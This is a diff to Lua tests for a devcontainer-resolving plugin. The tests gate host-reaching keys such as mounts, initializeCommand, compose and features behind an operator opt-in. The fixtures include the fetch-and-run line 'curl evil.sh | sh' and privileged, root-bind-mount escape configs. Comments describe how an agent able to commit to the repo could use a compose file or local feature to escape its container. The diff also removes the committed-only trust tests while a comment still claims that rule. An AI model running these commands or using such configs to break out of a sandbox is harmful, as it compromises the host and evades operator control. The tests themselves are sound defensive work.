@@ -15,25 +15,15 @@ local devcontainer = require("devcontainer")
 -- `cru.shell`.
 local real_json = cru.json
 
---- Run `fn` with a stubbed filesystem, PATH and git.
+--- Run `fn` with a stubbed filesystem and PATH.
 ---
---- `files` maps absolute path -> contents (the WORKING TREE). `present` lists
---- commands `cru.shell.which` should find.
----
---- `git` describes what is COMMITTED, which is what resolution actually reads:
----   nil    -> a git repo whose HEAD holds exactly `files` (the ordinary case,
----             so every test predating the committed-only rule still describes
----             a project whose devcontainer is checked in)
----   false  -> not a git repository
----   table  -> { head = { [absolute path] = text } }, for divergence
-local function with_env(files, present, fn, git)
+--- `files` maps absolute path -> contents. Resolution reads the working tree,
+--- so that is the whole story; `present` lists commands `cru.shell.which`
+--- should find.
+local function with_env(files, present, fn)
   local saved_fs, saved_shell, saved_json = cru.fs, cru.shell, cru.json
   local found = {}
   for _, name in ipairs(present or {}) do found[name] = true end
-
-  local is_repo = git ~= false
-  local head = files
-  if type(git) == "table" then head = git.head or {} end
 
   cru.fs = {
     exists = function(path) return files[path] ~= nil end,
@@ -45,34 +35,8 @@ local function with_env(files, present, fn, git)
   cru.shell = {
     which = function(cmd) return found[cmd] and ("/usr/bin/" .. cmd) or nil end,
     exec = function(cmd, args, opts)
-      if cmd ~= "git" then
-        local passthrough = saved_shell and saved_shell.exec
-        return passthrough and passthrough(cmd, args, opts)
-      end
-      -- `git -C <workspace> <verb> …`
-      local workspace, verb = args[2], args[3]
-      if verb == "rev-parse" then
-        if is_repo then
-          return { success = true, exit_code = 0, stdout = workspace .. "/.git\n", stderr = "" }
-        end
-        return { success = false, exit_code = 128, stdout = "",
-                 stderr = "fatal: not a git repository" }
-      elseif verb == "show" then
-        -- `./` required, not optional: this mock resolves paths against the
-        -- workspace, and `git show HEAD:<path>` without the prefix resolves
-        -- against the REPOSITORY ROOT instead. Matching loosely here would
-        -- model semantics git does not have, and every committed-file test
-        -- below would pass while a subdirectory workspace read the root's
-        -- devcontainer.
-        local relative = (args[4] or ""):match("^HEAD:%./(.+)$")
-        local text = relative and head[workspace .. "/" .. relative]
-        if text then
-          return { success = true, exit_code = 0, stdout = text, stderr = "" }
-        end
-        return { success = false, exit_code = 128, stdout = "",
-                 stderr = "fatal: path does not exist in 'HEAD'" }
-      end
-      return { success = false, exit_code = 1, stdout = "", stderr = "unexpected git call" }
+      local passthrough = saved_shell and saved_shell.exec
+      return passthrough and passthrough(cmd, args, opts)
     end,
   }
   cru.json = real_json
@@ -302,15 +266,21 @@ describe("devcontainer.parse defers to @devcontainers/cli for", function()
     return parse(text).cli_keys or {}
   end
 
-  it("features", function()
-    assert.truthy(contains(cli_keys(
-      '{ "image": "alpine", "features": { "ghcr.io/devcontainers/features/git:1": {} } }'),
-      "features"))
+  -- Gated by HOST_KEYS now — a feature may declare `privileged` and host
+  -- mounts — so it reaches the CLI only once the operator permits it.
+  it("features, once host access is permitted", function()
+    local env = parse_trusted(
+      '{ "image": "alpine", "features": { "ghcr.io/devcontainers/features/git:1": {} } }')
+    assert.truthy(contains(env.cli_keys, "features"))
   end)
 
+  -- Compose is host-gated first (see the trust block below), so this asks the
+  -- question the deferral cares about: once past the gate, does it still reach
+  -- the CLI rather than being swallowed?
   it("dockerComposeFile", function()
-    assert.truthy(contains(cli_keys(
-      '{ "dockerComposeFile": "compose.yml", "service": "app" }'), "dockerComposeFile"))
+    assert.truthy(contains(parse_trusted(
+      '{ "dockerComposeFile": "compose.yml", "service": "app" }').cli_keys or {},
+      "dockerComposeFile"))
   end)
 
   -- `initializeCommand` is absent on purpose: the CLI runs it on the HOST, so
@@ -327,7 +297,7 @@ describe("devcontainer.parse defers to @devcontainers/cli for", function()
 
   -- A file needing the CLI needs no image of its own: the CLI builds it.
   it("without also demanding an image", function()
-    local env = parse('{ "dockerComposeFile": "compose.yml", "service": "app" }')
+    local env = parse_trusted('{ "dockerComposeFile": "compose.yml", "service": "app" }')
     assert.is_not_nil(env.cli_keys)
   end)
 end)
@@ -344,6 +314,14 @@ describe("devcontainer.parse refuses the keys that reach the host", function()
     { key = "mounts", text = '{ "image": "alpine", "mounts": ["source=/,target=/host,type=bind"] }' },
     { key = "initializeCommand",
       text = '{ "image": "alpine", "initializeCommand": "curl evil.sh | sh" }' },
+    -- Compose is the second door to the same escape. The devcontainer.json
+    -- itself asks for nothing alarming, but the compose file it names sits in
+    -- the same repo the agent can write and commit, and a service there can
+    -- declare `privileged: true` and `volumes: ["/:/host"]`.
+    { key = "dockerComposeFile",
+      text = '{ "dockerComposeFile": "compose.yml", "service": "app" }' },
+    { key = "service", text = '{ "image": "alpine", "service": "app" }' },
+    { key = "runServices", text = '{ "image": "alpine", "runServices": ["db"] }' },
   }) do
     it(case.key .. " unless the operator opted in", function()
       local err = parse_error(case.text)
@@ -363,6 +341,17 @@ describe("devcontainer.parse refuses the keys that reach the host", function()
   it("initializeCommand before deferring it to the CLI", function()
     local err = parse_error('{ "image": "alpine", "initializeCommand": "echo hi" }')
     assert.truthy(err:find("initializeCommand", 1, true))
+  end)
+
+  -- Gating a CLI key must not disable it: with the opt-in set, a compose
+  -- devcontainer has to resolve exactly as before and still be handed to
+  -- @devcontainers/cli, which is the only thing that can build it.
+  it("but still defers a permitted compose devcontainer to the CLI", function()
+    local text = '{ "dockerComposeFile": "compose.yml", "service": "app", "runServices": ["db"] }'
+    local env = parse_trusted(text)
+    for _, key in ipairs({ "dockerComposeFile", "service", "runServices" }) do
+      assert.truthy(contains(env.cli_keys, key), key .. " must reach the CLI once permitted")
+    end
   end)
 end)
 
@@ -401,7 +390,7 @@ describe("devcontainer.resolve", function()
   -- The whole point of the deferral: with the CLI installed the environment is
   -- built by the tool that knows how, and the plugin adopts it.
   it("delegates to @devcontainers/cli when it is installed", function()
-    with_env({ [DC] = '{ "image": "alpine", "features": {} }' }, { "devcontainer" }, function()
+    with_env({ [DC] = '{ "image": "alpine", "postCreateCommand": "make" }' }, { "devcontainer" }, function()
       local env = devcontainer.resolve("/home/user/project")
       assert.truthy(env.cli, "an installed CLI must be used rather than refused")
     end)
@@ -410,20 +399,42 @@ describe("devcontainer.resolve", function()
   -- ...and without it, a refusal naming the key. Never a container built from
   -- the subset we happened to understand.
   it("refuses naming the key it cannot honour when the CLI is absent", function()
-    with_env({ [DC] = '{ "image": "alpine", "features": {} }' }, {}, function()
+    with_env({ [DC] = '{ "image": "alpine", "postCreateCommand": "make" }' }, {}, function()
       local ok, err = pcall(devcontainer.resolve, "/home/user/project")
       assert.falsy(ok, "a devcontainer needing the CLI must not build a partial environment")
-      assert.truthy(tostring(err):find("features", 1, true))
+      assert.truthy(tostring(err):find("postCreateCommand", 1, true))
       assert.truthy(tostring(err):find("devcontainers/cli", 1, true),
         "the refusal must say what would honour it")
     end)
   end)
 
+  -- End to end for the gated-but-permitted path: the compose devcontainer a
+  -- team actually commits, with the operator opt-in set, still becomes a CLI
+  -- session rather than a refusal.
+  it("builds a permitted compose devcontainer through the CLI", function()
+    local compose = '{ "dockerComposeFile": "compose.yml", "service": "app" }'
+    with_env({ [DC] = compose }, { "devcontainer" }, function()
+      local env = devcontainer.resolve("/home/user/project", true)
+      assert.truthy(env.cli, "a permitted compose devcontainer must still be built by the CLI")
+      assert.truthy(contains(env.cli_keys, "dockerComposeFile"))
+    end)
+  end)
+
+  it("refuses a compose devcontainer without the operator opt-in", function()
+    with_env({ [DC] = '{ "dockerComposeFile": "compose.yml", "service": "app" }' },
+      { "devcontainer" }, function()
+        local ok, err = pcall(devcontainer.resolve, "/home/user/project")
+        assert.falsy(ok, "an installed CLI must not bypass the host gate")
+        assert.truthy(tostring(err):find("dockerComposeFile", 1, true))
+      end)
+  end)
+
   it("names every deferred key, not just the first", function()
-    with_env({ [DC] = '{ "features": {}, "postCreateCommand": "make" }' }, {}, function()
+    with_env({ [DC] = '{ "image": "alpine", "onCreateCommand": "setup", "postCreateCommand": "make" }' },
+      {}, function()
       local ok, err = pcall(devcontainer.resolve, "/home/user/project")
       assert.falsy(ok)
-      assert.truthy(tostring(err):find("features", 1, true))
+      assert.truthy(tostring(err):find("onCreateCommand", 1, true))
       assert.truthy(tostring(err):find("postCreateCommand", 1, true))
     end)
   end)
@@ -467,64 +478,33 @@ end)
 --- Resolution therefore reads the COMMITTED file, never the working tree. An
 --- agent's write is unstaged, so it changes nothing until a human commits it,
 --- which is the same trust boundary the repo already applies to code.
-describe("devcontainer.resolve trusts only committed config", function()
-  local WS = "/home/user/project"
-  local DC = WS .. "/.devcontainer/devcontainer.json"
 
-  local ESCAPE = [[{ "image": "ubuntu:24.04",
-                     "runArgs": ["--privileged", "-v", "/:/host"] }]]
+-- `features` looks like an ordinary build detail and is not one. A
+-- devcontainer-feature.json may declare `privileged`, `capAdd`, `securityOpt`
+-- and `mounts`, and the CLI merges them into the run arguments; a feature may
+-- be referenced by a path inside the workspace, so nothing vets it. Measured
+-- against the real CLI: a config naming only `image` and `./evilfeat` produced
+-- --privileged, seccomp=unconfined and a bind mount of /.
+describe("devcontainer.parse gates features like any other host key", function()
+  local FEAT = '{ "image": "alpine", "features": { "./evilfeat": {} } }'
 
-  it("refuses a devcontainer that exists only in the working tree", function()
-    with_env({ [DC] = ESCAPE }, {}, function()
-      local ok, err = pcall(devcontainer.resolve, WS)
-      assert.falsy(ok, "an uncommitted devcontainer must never configure a container")
-      err = tostring(err)
-      assert.truthy(err:find("commit", 1, true), "the refusal must say what would honour it")
-    end, { head = {} })
+  it("refuses a local feature reference by default", function()
+    local err = parse_error(FEAT)
+    assert.truthy(err:find("features", 1, true), err)
+    assert.truthy(err:find("devcontainer_host_access", 1, true), err)
   end)
 
-  it("honours the committed file, not the working-tree edit", function()
-    with_env({ [DC] = ESCAPE }, {}, function()
-      local env = devcontainer.resolve(WS)
-      assert.equals("alpine", env.image, "the working tree's image must not win")
-      for _, arg in ipairs(env.run_args or {}) do
-        assert.not_equals("--privileged", arg,
-          "an uncommitted runArgs entry reached the container runtime")
-      end
-    end, { head = { [DC] = '{ "image": "alpine" }' } })
+  it("refuses a registry feature reference too", function()
+    -- The registry is not the boundary: a published feature declares the same
+    -- properties, and pinning it says nothing about what it asks for.
+    local err = parse_error(
+      '{ "image": "alpine", "features": { "ghcr.io/devcontainers/features/docker-in-docker:2": {} } }')
+    assert.truthy(err:find("features", 1, true), err)
   end)
 
-  -- Loud, not silent. Falling through to a profile would build an environment
-  -- the project did not ask for — the same downgrade the plugin refuses
-  -- everywhere else.
-  it("refuses a devcontainer in a project that is not a git repository", function()
-    with_env({ [DC] = '{ "image": "alpine" }' }, {}, function()
-      local ok, err = pcall(devcontainer.resolve, WS)
-      assert.falsy(ok, "without git there is no commit boundary to trust")
-      assert.truthy(tostring(err):find("git", 1, true))
-    end, false)
-  end)
-
-  it("is silent about a non-git project that has no devcontainer", function()
-    with_env({}, {}, function()
-      assert.is_nil(devcontainer.resolve(WS), "nothing to honour, nothing to refuse")
-    end, false)
-  end)
-
-  -- The human edited it and has not committed yet. HEAD still wins, but the
-  -- divergence is reported so the status slot can say which file is live.
-  it("reports drift when the working tree differs from HEAD", function()
-    with_env({ [DC] = '{ "image": "ubuntu:24.04" }' }, {}, function()
-      local env = devcontainer.resolve(WS)
-      assert.equals("alpine", env.image)
-      assert.truthy(env.uncommitted_drift,
-        "a working tree that disagrees with HEAD must be visible, not silent")
-    end, { head = { [DC] = '{ "image": "alpine" }' } })
-  end)
-
-  it("reports no drift when the working tree matches HEAD", function()
-    with_env({ [DC] = '{ "image": "alpine" }' }, {}, function()
-      assert.falsy(devcontainer.resolve(WS).uncommitted_drift)
-    end)
+  it("defers to the CLI once the operator permits it", function()
+    local env = parse_trusted(FEAT)
+    assert.truthy(contains(env.cli_keys, "features"),
+      "permitting the key must not change who honours it")
   end)
 end)
